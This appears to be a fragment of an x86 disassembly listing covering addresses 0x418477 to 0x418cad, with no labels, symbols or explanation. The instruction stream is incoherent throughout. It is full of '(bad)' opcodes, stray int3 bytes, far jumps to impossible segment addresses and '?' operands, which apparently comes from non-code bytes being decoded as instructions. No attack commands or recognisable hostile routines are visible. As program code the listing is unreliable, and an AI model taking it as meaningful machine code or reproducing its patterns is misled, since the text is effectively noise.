  418477:	jmp    FWORD PTR [eax-0xb768401]
  41847d:	cmp    eax,0xf98979
  418482:	(bad)  
  418483:	cmp    al,0x0
  418485:	add    bh,bh
  418487:	mov    DWORD PTR [ebx+0x620050ff],ebp
  41848d:	mov    cl,0xbe
  41848f:	mov    DWORD PTR [ebx+eax*4-0x76079d34],eax
  418496:	(bad)  
  418497:	(bad)  
  418498:	js     0x41849a
  41849a:	loopne 0x41849b
  41849c:	push   0xcc833fc9
  4184a1:	int3   
  4184a2:	add    BYTE PTR [edi+ecx*2],bh
  4184a5:	inc    DWORD PTR [ebx+0x42835a00]
  4184ab:	(bad)  
  4184ac:	mov    esp,0xaaffdb14
  4184b1:	add    bh,bh
  4184b3:	scas   eax,DWORD PTR es:[edi]
  4184b4:	xlat   BYTE PTR ds:[ebx]
  4184b5:	inc    DWORD PTR [ebx-0x51ffa001]
  4184bb:	add    dh,dh
  4184bd:	xchg   esi,eax
  4184be:	jl     0x4184bf
  4184c0:	leave  
  4184c1:	add    BYTE PTR [eax],al
  4184c3:	sahf   
  4184c4:	sbb    DWORD PTR [ebx+0x7fffff],eax
  4184ca:	loopne 0x418455
  4184cc:	int3   
  4184cd:	call   0xf0ff:0x72ff8c
  4184d4:	stos   DWORD PTR es:[edi],eax
  4184d5:	int3   
  4184d6:	add    DWORD PTR [ebx-0x203333],0xffffffb0
  4184dd:	sub    DWORD PTR [ebp-0x1],0x2d00ff68
  4184e4:	aad    0x89
  4184e6:	add    bh,bh
  4184e8:	mov    al,BYTE PTR [eax]
  4184ea:	cmp    eax,DWORD PTR [eax]
  4184ec:	lods   al,BYTE PTR ds:[esi]
  4184ed:	xor    edi,DWORD PTR [ecx-0x1]
  4184f0:	in     eax,dx
  4184f1:	(bad)  
  4184f2:	push   DWORD PTR [eax+ecx*4-0x5bff7c34]
  4184f9:	add    BYTE PTR [eax],bh
  4184fb:	int3   
  4184fc:	jge    0x4184f4
  4184fe:	iret   
  4184ff:	add    bl,bl
  418501:	add    ah,cl
  418503:	and    eax,0xffff44
  418508:	add    al,BYTE PTR [eax]
  41850a:	mov    ecx,0x4edda783
  41850f:	int3   
  418510:	sar    edi,0xff
  418513:	shr    DWORD PTR [ecx-0x2dff7c01],0x83
  41851a:	jle    0x4184e8
  41851c:	push   ecx
  41851d:	mov    bl,0xff
  41851f:	jmp    DWORD PTR [esi+0x0]
  418522:	adc    ebx,0xffffffe0
  418525:	inc    DWORD PTR [eax]
  418527:	add    DWORD PTR [edi+edi*8+0x71],0xffffffff
  41852c:	mov    cl,0x4b
  41852e:	sbb    al,BYTE PTR [eax]
  418530:	xor    DWORD PTR [eax],eax
  418532:	sub    DWORD PTR [esi+0x2],0xffffffff
  418536:	dec    esp
  418538:	lds    eax,FWORD PTR [eax]
  41853a:	and    bh,bh
  41853c:	stos   DWORD PTR es:[edi],eax
  41853d:	adc    cl,bl
  41853f:	(bad)  
  418540:	inc    BYTE PTR [ebx+0x29db89]
  418546:	add    BYTE PTR [eax],al
  418548:	sub    bh,bh
  41854a:	or     edi,edi
  41854c:	nop
  41854d:	jae    0x41851f
  41854f:	add    BYTE PTR [ecx+0x0],ch
  418552:	jmp    DWORD PTR [esi-0x15]
  418555:	add    DWORD PTR [eax],0xffffff83
  418558:	mov    ah,0xff
  41855a:	call   0xf90eed5e
  41855f:	(bad)  
  418560:	fiadd  DWORD PTR [eax]
  418562:	int3   
  418563:	dec    ecx
  418564:	jmp    0xbbca8668
  418569:	call   edx
  41856b:	add    BYTE PTR [ecx-0x47ffc63d],ah
  418571:	inc    DWORD PTR [eax]
  418573:	imul   ebx,DWORD PTR [edx+0xf0089ff],0xd3ff8a83
  41857d:	test   BYTE PTR [ebx],0x83
  418580:	call   0xe5300984
  418585:	add    BYTE PTR [eax],al
  418587:	inc    DWORD PTR [edx-0x1]
  41858a:	fild   DWORD PTR [eax]
  41858c:	push   0x3d
  41858e:	in     al,0x0
  418590:	jp     0x418591
  418592:	inc    DWORD PTR [eax-0x76007c9a]
  418598:	push   edi
  418599:	add    BYTE PTR [eax+0xe2ddb83],ch
  41859f:	inc    DWORD PTR [ebp-0x7d]
  4185a2:	xor    ecx,0x46
  4185a5:	inc    DWORD PTR [eax]
  4185a7:	dec    DWORD PTR [ebx-0x7a00f37d]
  4185ad:	ret    
  4185ae:	mov    esi,0x8300a1ff
  4185b3:	das    
  4185b4:	xor    bh,bh
  4185b6:	(bad)  
  4185b7:	dec    DWORD PTR [esi-0x1]
  4185ba:	pop    ebx
  4185bb:	add    cl,ah
  4185bd:	adc    bl,ch
  4185bf:	inc    DWORD PTR [ecx+0x0]
  4185c2:	jmp    FWORD PTR [eax]
  4185c4:	mov    bh,bh
  4185c6:	(bad)  
  4185c7:	call   FWORD PTR [ebx]
  4185c9:	sbb    DWORD PTR [edx+0x0],0x13
  4185cd:	lahf   
  4185ce:	cmp    bh,bh
  4185d0:	test   eax,0xbbc083ff
  4185d5:	add    DWORD PTR [eax],0xffffff83
  4185d8:	arpl   WORD PTR [eax],ax
  4185da:	jb     0x4185dc
  4185dc:	add    al,BYTE PTR [edi]
  4185de:	ret    0x12ff
  4185e1:	int3   
  4185e2:	add    BYTE PTR [edi],ch
  4185e4:	js     0x418569
  4185e6:	add    ah,cl
  4185e8:	xor    al,0x89
  4185ea:	push   eax
  4185eb:	add    dl,dl
  4185ed:	iret   
  4185ee:	xor    DWORD PTR [ebx+0x2ecc005a],eax
  4185f4:	xor    cl,BYTE PTR [ecx-0x336a0000]
  4185fa:	and    eax,0xfcdbe283
  4185ff:	push   ebx
  418601:	add    BYTE PTR [ebx-0xffe8f7],al
  418607:	add    BYTE PTR [ebx],al
  418609:	inc    DWORD PTR [ecx]
  41860b:	mov    edx,edi
  41860d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41860e:	int    0x89
  418610:	(bad)  
  418612:	jmp    DWORD PTR [ebp+0x73]
  418615:	(bad)  
  418616:	inc    DWORD PTR [eax]
  418618:	fld    DWORD PTR [eax]
  41861a:	dec    ah
  41861c:	sbb    BYTE PTR [ecx-0x570095],al
  418622:	inc    edx
  418624:	call   0x9e4285b2
  418629:	add    BYTE PTR [ebx+eax*4+0xec5120],dh
  418630:	and    bh,bh
  418632:	int3   
  418633:	xor    ebp,0x85ffffcc
  418639:	call   FWORD PTR [esi]
  41863b:	push   DWORD PTR [ecx+0x74ffd066]
  418641:	add    BYTE PTR [eax],al
  418643:	sbb    edx,DWORD PTR [ebx-0x77]
  418646:	(bad)  
  418647:	call   esp
  418649:	dec    DWORD PTR [eax-0x17a67001]
  41864f:	jmp    DWORD PTR [edi+0x0]
  418652:	adc    DWORD PTR [esi-0x3376c9],0xffffffc8
  418659:	add    BYTE PTR [eax],ch
  41865b:	add    BYTE PTR [ebx+0x6f],al
  41865e:	push   ds
  41865f:	add    BYTE PTR [ebx-0x1],dl
  418662:	add    ah,ch
  418664:	ret    0x8300
  418667:	dec    DWORD PTR [edi]
  418669:	jmp    edi
  41866b:	call   DWORD PTR [ecx-0x2e00570f]
  418671:	(bad)  
  418672:	push   DWORD PTR [esi+0xf]
  418675:	dec    esp
  418677:	add    dh,dh
  418679:	add    BYTE PTR [edi+0xaf604ff],dh
  41867f:	dec    DWORD PTR [ecx-0x1]
  418682:	int3   
  418683:	sti    
  418684:	stos   DWORD PTR es:[edi],eax
  418685:	add    bh,bh
  418687:	inc    ebp
  418689:	call   FWORD PTR [edx+0x4ff45fff]
  41868f:	sbb    DWORD PTR [edi+edi*8-0x1],0x1c
  418694:	aas    
  418695:	int3   
  418696:	add    ah,cl
  418698:	sbb    edi,edi
  41869a:	adc    al,0xff
  41869c:	jl     0x418718
  41869e:	or     edi,edi
  4186a0:	idiv   edi
  4186a2:	add    BYTE PTR [edx],dl
  4186a4:	cmp    bh,0x0
  4186a7:	add    bh,bh
  4186a9:	add    ah,cl
  4186ab:	int3   
  4186ac:	jecxz  0x418636
  4186ae:	or     esp,ecx
  4186b0:	fmul   st(4),st
  4186b2:	or     DWORD PTR [esi+edi*2+0x6200ffff],0xffffff83
  4186ba:	xchg   edi,eax
  4186bb:	add    BYTE PTR [edi-0x75],cl
  4186be:	dec    eax
  4186bf:	jmp    FWORD PTR [edi+edi*8+0x4b68ff]
  4186c6:	mov    edi,edi
  4186c8:	jecxz  0x4186c9
  4186ca:	test   al,0x83
  4186cc:	(bad)  
  4186cd:	sahf   
  4186ce:	jle    0x4186cf
  4186d0:	and    al,0x0
  4186d2:	add    BYTE PTR [edx-0x3376],dl
  4186d8:	sahf   
  4186d9:	dec    DWORD PTR [eax+0x0]
  4186dc:	or     ah,al
  4186de:	mov    ds:0xff00f2ff,al
  4186e3:	addr16 aad 0x0
  4186e6:	(bad)  
  4186e7:	jmp    FWORD PTR [edi+edi*8-0x6c05000c]
  4186ee:	pop    DWORD PTR [eax]
  4186f0:	push   es
  4186f1:	add    BYTE PTR [eax],al
  4186f3:	int3   
  4186f4:	sub    eax,0x3f00ffff
  4186f9:	push   DWORD PTR ds:0xf133deff
  4186ff:	(bad)  
  418700:	cmp    edi,edi
  418702:	add    BYTE PTR [esi],bl
  418704:	lods   al,BYTE PTR ds:[esi]
  418705:	(bad)  
  418706:	(bad)  
  418707:	call   FWORD PTR [ebx+0x11ff2b89]
  41870d:	jmp    0x4000:0xff87cce7
  418714:	scas   eax,DWORD PTR es:[edi]
  418715:	int3   
  418716:	(bad)  
  418717:	call   DWORD PTR [esi]
  418719:	add    BYTE PTR [ecx],bl
  41871b:	add    BYTE PTR [esi+0x35896a9c],ch
  418721:	add    bh,bh
  418723:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418724:	data16 int3 
  418726:	(bad)  
  418727:	dec    ebp
  418729:	int3   
  41872a:	push   ss
  41872b:	add    bh,ch
  41872d:	adc    al,0xe
  41872f:	dec    DWORD PTR [edi+edi*8]
  418732:	call   FWORD PTR [eax+0xffff9a]
  418738:	popf   
  418739:	add    BYTE PTR [esi-0x6922001],ch
  41873f:	mov    ebx,edx
  418741:	int3   
  418742:	(bad)  
  418743:	(bad)  
  418745:	cmp    edi,0xffffffff
  418748:	mov    bl,0x89
  41874a:	icebp  
  41874b:	add    ch,ah
  41874d:	popa   
  41874e:	jecxz  0x41874f
  418750:	out    dx,al
  418751:	dec    DWORD PTR [ecx-0xffd25a]
  418757:	push   ebx
  418759:	adc    DWORD PTR [ebp+0x7be8e7ff],0xffffffff
  418760:	pop    ebx
  418761:	int3   
  418762:	(bad)  
  418763:	call   0x415443
  418768:	mov    cl,0x0
  41876a:	in     eax,0xff
  41876c:	inc    ebp
  41876d:	or     dl,BYTE PTR ds:0x836fff
  418773:	pop    ss
  418774:	mov    ecx,0xb7ff0089
  418779:	add    dl,bh
  41877b:	add    al,bl
  41877d:	pop    es
  41877e:	enter  0x28ff,0x0
  418782:	push   edx
  418784:	push   edi
  418785:	add    BYTE PTR [eax],al
  418787:	cmp    edi,0xffffff89
  41878a:	jno    0x41878b
  41878c:	scas   eax,DWORD PTR es:[edi]
  41878d:	out    0x84,eax
  41878f:	or     DWORD PTR [edx-0x1],0xffffffff
  418793:	add    BYTE PTR [esi-0xaffff01],al
  418799:	mov    DWORD PTR [esi],esi
  41879b:	dec    edi
  41879d:	test   ecx,esi
  41879f:	mov    DWORD PTR [ecx-0x376aff01],esi
  4187a5:	add    bh,bh
  4187a7:	(bad)  
  4187a8:	call   0x66c48aad
  4187ad:	xchg   DWORD PTR [ebp-0x7600c034],ecx
  4187b3:	mov    bh,BYTE PTR [edi-0x1e330001]
  4187b9:	mov    DWORD PTR [edx-0x1],esp
  4187bc:	mov    edx,0x6e00e198
  4187c1:	(bad)  
  4187c2:	inc    ebp
  4187c4:	and    eax,DWORD PTR [ebx-0x760100]
  4187ca:	clc    
  4187cb:	add    BYTE PTR [edx+0x5e],dh
  4187ce:	cli    
  4187cf:	add    BYTE PTR [esi],bl
  4187d1:	(bad)  
  4187d2:	call   DWORD PTR [ebp-0x6f]
  4187d5:	add    BYTE PTR [ecx+0x6789e2ff],cl
  4187db:	add    BYTE PTR [ebx],dh
  4187dd:	cmp    al,0x2f
  4187df:	add    ch,cl
  4187e1:	add    DWORD PTR [ebx-0xaaa6],0x0
  4187e8:	mov    ds:0xa5ffe7ff,eax
  4187ed:	or     dl,al
  4187ef:	add    edi,0xffffff83
  4187f2:	add    DWORD PTR [ebx-0x767cfff9],0x63
  4187f9:	or     DWORD PTR [esi],0xffffff83
  4187fc:	repz push ebp
  4187fe:	(bad)  
  4187ff:	inc    DWORD PTR [ebx+0x0]
  418802:	adc    DWORD PTR [ebx-0xff00b9],0x72
  418809:	mov    DWORD PTR [edi-0x1],esp
  41880c:	and    dl,BYTE PTR [ebx]
  41880e:	or     DWORD PTR [eax],eax
  418810:	test   eax,0xc96789ff
  418815:	cmp    edi,0xffffffcc
  418818:	inc    esp
  418819:	jmp    edx
  41881b:	call   FWORD PTR [edi]
  41881d:	jp     0x418859
  41881f:	xor    ecx,0xffffffcc
  418822:	call   DWORD PTR [ebx-0x4d]
  418825:	int3   
  418826:	int3   
  418827:	add    bh,bh
  418829:	int3   
  41882a:	mov    ah,0x83
  41882c:	add    eax,0xa8cc6c9d
  418831:	int3   
  418832:	int3   
  418833:	cmp    bh,dh
  418835:	add    BYTE PTR [eax],al
  418837:	call   DWORD PTR [edi+0x0]
  41883a:	mov    ebx,0x448f1700
  41883f:	add    BYTE PTR [edx],ah
  418841:	add    bh,bh
  418843:	addr16 in eax,dx
  418845:	cmp    edi,0xffffffff
  418848:	aam    0xff
  41884a:	out    dx,eax
  41884b:	add    BYTE PTR [ecx],dl
  41884d:	outs   dx,DWORD PTR ds:[esi]
  41884e:	adc    bh,bh
  418850:	fadd   QWORD PTR [eax]
  418852:	add    BYTE PTR [ebx],al
  418854:	loopne 0x418855
  418856:	add    ah,cl
  418858:	mov    dh,0x89
  41885a:	push   ebp
  41885b:	jmp    DWORD PTR [esi+0x62]
  41885e:	pop    ebx
  41885f:	add    BYTE PTR [ebp-0x649d3301],ah
  418865:	dec    DWORD PTR [ecx+0x5bffc200]
  41886b:	int3   
  41886c:	inc    ecx
  41886d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41886e:	ret    0x7dff
  418871:	add    DWORD PTR [ebx+0xd85d],0xffffffff
  418878:	in     eax,dx
  418879:	and    DWORD PTR [ecx+0x38404b00],0x0
  418880:	add    bh,bh
  418882:	add    BYTE PTR [edx+0x7e],cl
  418885:	add    BYTE PTR [ebx+0x72004f83],al
  41888b:	or     ecx,0xffffffe3
  41888e:	xchg   edi,edi
  418890:	mov    eax,ds:0x87770089
  418895:	dec    esp
  418897:	int3   
  418898:	and    al,BYTE PTR [ebx+0x1909008b]
  41889e:	inc    BYTE PTR [eax]
  4188a0:	test   edi,edi
  4188a2:	add    BYTE PTR [esi-0x7c7c0043],bh
  4188a8:	jg     0x41882d
  4188aa:	add    al,0xff
  4188ac:	jne    0x41882e
  4188ae:	dec    ebp
  4188af:	add    BYTE PTR [eax+eax*1-0x1],dh
  4188b3:	loopne 0x418930
  4188b5:	(bad)  
  4188b6:	inc    DWORD PTR [eax]
  4188b8:	jo     0x4188b9
  4188ba:	cli    
  4188bb:	add    BYTE PTR [ebx-0x6d],bl
  4188be:	nop
  4188bf:	add    BYTE PTR [eax+eax*1+0x0],dl
  4188c3:	pop    eax
  4188c4:	push   ss
  4188c5:	add    BYTE PTR [eax],al
  4188c7:	jmp    esp
  4188c9:	add    BYTE PTR [ebp-0x1],bl
  4188cc:	(bad)  
  4188cd:	fcomp  QWORD PTR [esi-0xff2400]
  4188d3:	iret   
  4188d4:	scas   al,BYTE PTR es:[edi]
  4188d5:	dec    DWORD PTR [ecx+0x45008e00]
  4188db:	push   DWORD PTR [eax+edx*8]
  4188de:	push   edi
  4188df:	add    bl,ah
  4188e1:	add    BYTE PTR [ebx-0x7cff6464],al
  4188e7:	call   FWORD PTR [esi-0x4b002901]
  4188ed:	shl    al,0xff
  4188f0:	xor    al,0x83
  4188f2:	sbb    esi,0x4d
  4188f5:	cmp    edi,0xffffffff
  4188f8:	sub    bh,bh
  4188fa:	add    DWORD PTR [eax],0x71
  4188fd:	fbstp  TBYTE PTR [ebx]
  4188ff:	add    BYTE PTR [eax+eax*1-0xbbcd01],al
  418906:	inc    DWORD PTR [eax]
  418908:	rol    DWORD PTR [eax],cl
  41890a:	add    eax,DWORD PTR [eax]
  41890c:	jb     0x4188fb
  41890e:	xor    bh,bh
  418910:	and    eax,0x8b410000
  418915:	(bad)  
  418916:	(bad)  
  418917:	jmp    FWORD PTR [esi]
  418919:	(bad)  
  41891a:	aas    
  41891b:	(bad)  
  41891c:	fld    TBYTE PTR [ebx-0x7a76dd]
  418922:	jmp    DWORD PTR [edi+ebx*2+0x0]
  418926:	add    bh,bh
  418928:	pop    DWORD PTR [eax]
  41892a:	add    ecx,esp
  41892c:	add    al,0x38
  41892e:	add    DWORD PTR [eax],0xffffff0e
  418934:	jnp    0x418935
  418936:	inc    DWORD PTR [eax]
  418938:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418939:	call   FWORD PTR [esi]
  41893b:	or     DWORD PTR [edi+0x56],0x63
  41893f:	call   ebx
  418941:	add    bh,bh
  418943:	mov    ebx,0xffff0074
  418948:	xor    eax,DWORD PTR [eax]
  41894a:	cmp    al,0x0
  41894c:	loop   0x4189ac
  41894e:	jbe    0x4188d3
  418950:	cwde   
  418951:	(bad)  
  418952:	inc    DWORD PTR [ebp-0x7671]
  418958:	int    0x0
  41895a:	xchg   edi,edi
  41895c:	mov    esp,0xb0008c1c
  418961:	add    BYTE PTR [eax],al
  418963:	mov    esp,0xccff0006
  418968:	cmp    eax,0x4dff1883
  41896d:	loopne 0x41897c
  41896f:	(bad)  
  418970:	jmp    0x0:0xf63200ff
  418977:	call   DWORD PTR [eax]
  418979:	(bad)  
  41897a:	jp     0x41897c
  41897c:	neg    DWORD PTR [edx+edx*4+0x8373ff]
  418983:	xchg   ecx,eax
  418984:	dec    edx
  418985:	mov    edi,edi
  418987:	mov    DWORD PTR [eax+0x0],ebp
  41898a:	sbb    BYTE PTR [ecx+0x8fde5d],cl
  418990:	addr16 int3 
  418992:	and    ebx,0xffffffe8
  418995:	add    BYTE PTR [ebx+0x7c83ecff],al
  41899b:	call   DWORD PTR [edx+0x3b831d1d]
  4189a1:	(bad)  
  4189a2:	inc    edx
  4189a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4189a5:	(bad)  
  4189a6:	(bad)  
  4189a7:	jmp    eax
  4189a9:	add    BYTE PTR [edi-0x1],dl
  4189ac:	jg     0x418983
  4189ae:	inc    eax
  4189af:	mov    DWORD PTR [ecx-0xda30000],edi
  4189b5:	add    BYTE PTR [eax],al
  4189b7:	(bad)  
  4189b8:	fadd   DWORD PTR [eax]
  4189ba:	inc    DWORD PTR [eax]
  4189bc:	(bad)  
  4189bd:	(bad)  
  4189be:	dec    DWORD PTR [ecx+0xa00fffd]
  4189c4:	add    DWORD PTR [ebx-0x76ce33],0x0
  4189cb:	dec    ebx
  4189cc:	sub    ebp,DWORD PTR [eax-0x7d]
  4189cf:	ins    DWORD PTR es:[edi],dx
  4189d0:	(bad)  
  4189d1:	dec    esp
  4189d3:	mov    ebx,0xd9820083
  4189d8:	add    BYTE PTR [eax],al
  4189da:	add    bl,dh
  4189dc:	inc    ebx
  4189dd:	loope  0x4189de
  4189df:	js     0x418a36
  4189e1:	int3   
  4189e2:	call   FWORD PTR [ecx-0x52eb0100]
  4189e8:	inc    DWORD PTR [eax]
  4189ea:	add    BYTE PTR [ecx],bh
  4189ec:	js     0x418a34
  4189ee:	dec    DWORD PTR [ebx+0x37ffff69]
  4189f4:	inc    DWORD PTR [eax]
  4189f6:	dec    DWORD PTR [ebp-0x1]
  4189f9:	add    BYTE PTR [eax],al
  4189fb:	inc    esi
  4189fc:	in     al,dx
  4189fd:	sbb    ecx,DWORD PTR [ecx+0xff641c]
  418a03:	mov    edx,0x471c0000
  418a08:	add    BYTE PTR [eax],al
  418a0a:	add    BYTE PTR [edi-0x19],bl
  418a0d:	jns    0x418a0e
  418a0f:	call   0x9bca8b00
  418a14:	add    DWORD PTR [eax],0xffffffc6
  418a17:	lods   al,BYTE PTR ds:[esi]
  418a18:	dec    DWORD PTR [ecx-0x75549e00]
  418a1e:	push   DWORD PTR [edi]
  418a20:	sub    DWORD PTR [ebx-0xff4901],eax
  418a26:	jge    0x418a2e
  418a28:	add    bh,bh
  418a2a:	inc    DWORD PTR [esi+0x7f001dc3]
  418a30:	rol    BYTE PTR [eax],1
  418a32:	and    DWORD PTR [esi+0x38bf00ff],0x0
  418a39:	(bad)  
  418a3a:	jmp    DWORD PTR [ecx-0x7100f515]
  418a40:	cld    
  418a41:	add    BYTE PTR [ebx-0x337cff78],al
  418a47:	or     eax,0x8500ffff
  418a4c:	sbb    ah,BYTE PTR [esi]
  418a4e:	or     edi,0xffffffbc
  418a51:	(bad)  
  418a52:	push   edi
  418a54:	add    bh,bh
  418a56:	ins    DWORD PTR es:[edi],dx
  418a57:	cdq    
  418a58:	inc    DWORD PTR [eax]
  418a5a:	add    ebp,0x9
  418a5d:	pop    esi
  418a5e:	add    BYTE PTR [ebx-0x560000fa],dl
  418a64:	add    DWORD PTR [ebx-0x330098d1],0xffffff83
  418a6b:	loope  0x418ac8
  418a6d:	popf   
  418a6e:	call   DWORD PTR [eax]
  418a70:	das    
  418a71:	(bad)  
  418a72:	call   FWORD PTR [ebx+0x2a09ffff]
  418a78:	add    bh,bh
  418a7a:	call   FWORD PTR [edx-0x1affa953]
  418a80:	sahf   
  418a81:	inc    DWORD PTR [eax]
  418a83:	test   DWORD PTR [eax],0xff04e0ff
  418a89:	inc    DWORD PTR [ebx-0x941ea6]
  418a8f:	sub    eax,0xf78383f0
  418a94:	(bad)  
  418a95:	jmp    DWORD PTR [edx]
  418a97:	xor    edi,edi
  418a99:	add    BYTE PTR [ebx-0x367d60],al
  418a9f:	mov    DWORD PTR [ebx+eax*4-0x7d],eax
  418aa3:	pop    ds
  418aa4:	(bad)  
  418aa5:	dec    DWORD PTR [ebp+0x83006a]
  418aab:	push   esp
  418aac:	scas   al,BYTE PTR es:[edi]
  418aad:	jmp    0xafe1b1
  418ab2:	add    BYTE PTR [edx],cl
  418ab4:	(bad)  
  418ab5:	call   FWORD PTR [ebx+0xfa]
  418abb:	sub    ebx,esp
  418abd:	retf   
  418abe:	inc    DWORD PTR [edi-0x1d]
  418ac1:	add    bh,bh
  418ac3:	pop    ss
  418ac4:	mov    edi,edi
  418ac6:	xchg   ebx,eax
  418ac7:	cld    
  418ac8:	inc    DWORD PTR [eax]
  418aca:	add    bl,ah
  418acc:	lock popa 
  418ace:	(bad)  
  418acf:	call   0x90418b3e
  418ad4:	add    BYTE PTR [ebx-0xffb495],al
  418ada:	int3   
  418adb:	mov    WORD PTR [esi+0x16],ss
  418ade:	adc    DWORD PTR [ecx],0xffffffc2
  418ae1:	add    bh,bh
  418ae3:	mov    al,ds:0x39f400cc
  418ae8:	(bad)  
  418ae9:	dec    DWORD PTR [ecx+0x70e220]
  418aef:	pop    ebx
  418af0:	and    al,0xff
  418af2:	xor    DWORD PTR [edx],0xffffffff
  418af5:	(bad)  
  418af6:	jp     0x418b74
  418af8:	dec    esp
  418afa:	push   DWORD PTR [ecx-0x27]
  418afd:	into   
  418afe:	add    BYTE PTR [ecx],dh
  418b00:	pop    edi
  418b01:	add    BYTE PTR [eax],al
  418b03:	dec    ebp
  418b04:	inc    DWORD PTR [eax]
  418b06:	fnstenv [edx-0x6d000034]
  418b0c:	fld    DWORD PTR [edx-0x7cf0d87d]
  418b12:	add    BYTE PTR [edi+edi*8-0x77],bl
  418b16:	sahf   
  418b17:	fld    QWORD PTR [ebx-0x358aff01]
  418b1d:	pop    ss
  418b1e:	(bad)  
  418b1f:	cmp    al,0x9e
  418b21:	add    bh,bh
  418b23:	cmc    
  418b24:	add    bh,bh
  418b26:	daa    
  418b27:	sbb    bh,bh
  418b29:	mov    DWORD PTR [eax],eax
  418b2b:	xor    bh,BYTE PTR [edi+0x6a]
  418b2e:	and    DWORD PTR [edx+0x1dffff75],0xffffff83
  418b35:	add    dh,dl
  418b37:	pop    ebp
  418b38:	add    bh,bh
  418b3a:	push   DWORD PTR [ebx-0x66]
  418b3d:	mov    bh,0xff
  418b3f:	fwait
  418b40:	cwde   
  418b41:	(bad)  
  418b42:	(bad)  
  418b43:	fild   DWORD PTR [ebx+0x74fbff]
  418b49:	or     DWORD PTR [ecx-0xae9f7b],0xffffff91
  418b50:	pop    edx
  418b51:	inc    DWORD PTR [ebx+0x24ccff07]
  418b57:	mov    ?,edi
  418b59:	add    DWORD PTR [eax],0xfffffffa
  418b5c:	mov    edi,0xe600ffcf
  418b61:	inc    DWORD PTR [eax]
  418b63:	popa   
  418b64:	inc    DWORD PTR [eax]
  418b66:	pop    edi
  418b67:	push   eax
  418b68:	add    bh,bh
  418b6a:	add    BYTE PTR [ebx-0x2f00606f],dh
  418b70:	mov    ecx,0xa8ffff
  418b75:	jmp    DWORD PTR [edi+0x38]
  418b78:	add    DWORD PTR [eax],0xffffffff
  418b7b:	and    bl,0x57
  418b7e:	jmp    DWORD PTR [esi+0x79]
  418b81:	inc    DWORD PTR [eax]
  418b83:	sbb    edi,edi
  418b85:	add    BYTE PTR [esi-0x47],ah
  418b8b:	push   eax
  418b8c:	dec    ecx
  418b8d:	pop    ebx
  418b8e:	int3   
  418b8f:	clc    
  418b90:	call   0xabff:0xfffb0083
  418b97:	mov    edi,?
  418b99:	dec    DWORD PTR [ecx-0x7616b3d1]
  418b9f:	inc    ecx
  418ba0:	enter  0xffff,0x9a
  418ba4:	add    ah,cl
  418ba6:	jmp    0x4f03:0x8983ff1f
  418bad:	xchg   ebp,eax
  418bae:	add    bh,dl
  418bb0:	addr16 add bh,bh
  418bb3:	je     0x418bb4
  418bb5:	(bad)  
  418bb6:	out    dx,eax
  418bb7:	mov    bh,0xff
  418bb9:	inc    DWORD PTR [ebx+0x967027]
  418bbf:	shl    dl,cl
  418bc1:	mov    DWORD PTR [ebx-0x53ff001c],eax
  418bc7:	pop    esi
  418bc8:	int3   
  418bc9:	add    bh,bh
  418bcb:	leave  
  418bcc:	mov    esi,0xf7a000cb
  418bd1:	add    bh,bh
  418bd3:	xchg   ecx,eax
  418bd4:	add    BYTE PTR [ecx-0x7c7603e3],cl
  418bda:	dec    DWORD PTR [ecx+0x72ffd6c8]
  418be0:	je     0x418be2
  418be2:	int3   
  418be3:	sahf   
  418be4:	cmp    edi,0x5e
  418be7:	push   esp
  418be8:	add    bh,bh
  418bea:	sub    DWORD PTR [eax+0x68],0x4d
  418bee:	add    al,dh
  418bf0:	mov    DWORD PTR [eax],0xffd383
  418bf6:	add    BYTE PTR [ebp-0x34],bh
  418bf9:	(bad)  
  418bfa:	call   FWORD PTR [edx]
  418bfc:	or     BYTE PTR [eax-0xbf7201],cl
  418c02:	(bad)  
  418c03:	cmp    edi,edi
  418c05:	push   ebx
  418c07:	xchg   ebx,eax
  418c08:	inc    DWORD PTR [eax]
  418c0a:	(bad)  
  418c0b:	jg     0x418c63
  418c0d:	pop    ds
  418c0e:	push   DWORD PTR [edi]
  418c10:	fild   DWORD PTR [eax]
  418c12:	(bad)  
  418c13:	cmp    eax,0xebdbff00
  418c18:	(bad)  
  418c19:	(bad)  
  418c1a:	(bad)  
  418c1b:	cli    
  418c1c:	das    
  418c1d:	push   eax
  418c1e:	add    BYTE PTR [eax-0x7300ff22],dh
  418c24:	int3   
  418c25:	int3   
  418c26:	ja     0x418c91
  418c28:	(bad)  
  418c29:	inc    DWORD PTR [eax]
  418c2b:	das    
  418c2c:	sub    eax,0x643aff60
  418c31:	int3   
  418c32:	sbb    edi,0xffffffcc
  418c35:	(bad)  
  418c36:	aas    
  418c37:	fwait
  418c38:	add    BYTE PTR [eax],al
  418c3a:	dec    edi
  418c3c:	xchg   ebx,eax
  418c3d:	retf   0x1aff
  418c40:	xlat   BYTE PTR ds:[ebx]
  418c41:	(bad)  
  418c42:	jmp    DWORD PTR [eax]
  418c44:	add    bh,bh
  418c46:	fcom   QWORD PTR [ebx+0x3affccff]
  418c4c:	push   es
  418c4d:	iret   
  418c4e:	add    BYTE PTR [esi-0x58ff7c64],cl
  418c54:	(bad)  
  418c55:	push   DWORD PTR [ebx+0xff838a]
  418c5b:	mov    al,0xdb
  418c5d:	mov    esp,0xff0c2b00
  418c62:	add    BYTE PTR [edi],al
  418c64:	inc    DWORD PTR [eax]
  418c66:	sbb    edi,DWORD PTR [ecx-0x4d000001]
  418c6c:	sub    DWORD PTR [ebp+0x0],esi
  418c6f:	inc    esi
  418c70:	aam    0x83
  418c72:	adc    DWORD PTR ds:0x82e6ff00,0x0
  418c79:	add    bh,bh
  418c7b:	ficomp WORD PTR [esi+0x47]
  418c7e:	sub    edx,0x2d
  418c81:	add    ah,cl
  418c83:	int    0xff
  418c85:	add    BYTE PTR [esi+edi*2-0x77],ch
  418c89:	mov    edi,edi
  418c8b:	push   cs
  418c8c:	sbb    eax,DWORD PTR [ebx]
  418c8e:	inc    DWORD PTR [eax+0x38]
  418c91:	inc    DWORD PTR [eax]
  418c93:	icebp  
  418c94:	(bad)  
  418c95:	inc    ecx
  418c97:	cdq    
  418c98:	(bad)  
  418c99:	dec    esp
  418c9b:	in     al,dx
  418c9c:	aam    0xfe
  418c9e:	mov    DWORD PTR [esi+0x6a00ffe1],edi
  418ca4:	(bad)  
  418ca5:	jmp    FWORD PTR [esp+ecx*1+0x0]
  418ca9:	cmp    edi,0x2d
  418cac:	pop    esp
  418cad:	rol    DWORD PTR [eax],1
